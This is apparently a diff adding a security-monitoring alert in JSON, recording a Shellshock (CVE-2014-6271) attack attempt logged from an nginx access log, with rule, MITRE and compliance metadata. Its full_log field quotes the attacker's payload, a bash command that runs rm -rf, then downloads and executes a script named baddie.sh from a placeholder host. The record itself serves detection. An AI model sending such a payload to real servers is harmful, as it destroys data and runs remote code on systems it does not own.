@@ -1,0 +1,76 @@
+{
+  "input": {
+    "type": "log"
+  },
+  "agent": {
+    "name": "redacted.com",
+    "id": "000"
+  },
+  "manager": {
+    "name": "redacted.com"
+  },
+  "data": {
+    "protocol": "GET",
+    "srcip": "000.111.222.10",
+    "id": "404",
+    "url": "/cgi-bin/jarrewrite.sh"
+  },
+  "rule": {
+    "firedtimes": 1,
+    "mail": false,
+    "level": 6,
+    "pci_dss": [
+      "11.4"
+    ],
+    "tsc": [
+      "CC6.1",
+      "CC6.8",
+      "CC7.2",
+      "CC7.3"
+    ],
+    "description": "Shellshock attack attempt",
+    "groups": [
+      "web",
+      "accesslog",
+      "attack"
+    ],
+    "mitre": {
+      "technique": [
+        "Exploitation for Privilege Escalation",
+        "Exploit Public-Facing Application"
+      ],
+      "id": [
+        "T1068",
+        "T1190"
+      ],
+      "tactic": [
+        "Privilege Escalation",
+        "Initial Access"
+      ]
+    },
+    "id": "31166",
+    "nist_800_53": [
+      "SI.4"
+    ],
+    "info": "CVE-2014-6271https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271",
+    "gdpr": [
+      "IV_35.7.d"
+    ]
+  },
+  "location": "/var/log/nginx/access.log",
+  "decoder": {
+    "name": "web-accesslog"
+  },
+  "id": "1707402914.872885",
+  "GeoLocation": {
+    "city_name": "Amsterdam",
+    "country_name": "Netherlands",
+    "region_name": "North Holland",
+    "location": {
+      "lon": 4.9087,
+      "lat": 52.3534
+    }
+  },
+  "full_log": "000.111.222.10 - - [08/Feb/2024:11:35:12 -0300] \"GET /cgi-bin/jarrewrite.sh HTTP/1.1\" 404 162 \"-\" \"() { :; }; echo ; /bin/bash -c 'rm -rf *; cd /tmp; wget http://0.0.0.0/baddie.sh; chmod 777 baddie.sh; ./baddie.sh'\"",
+  "timestamp": "2024-02-08T11:35:14.334-0300"
+}
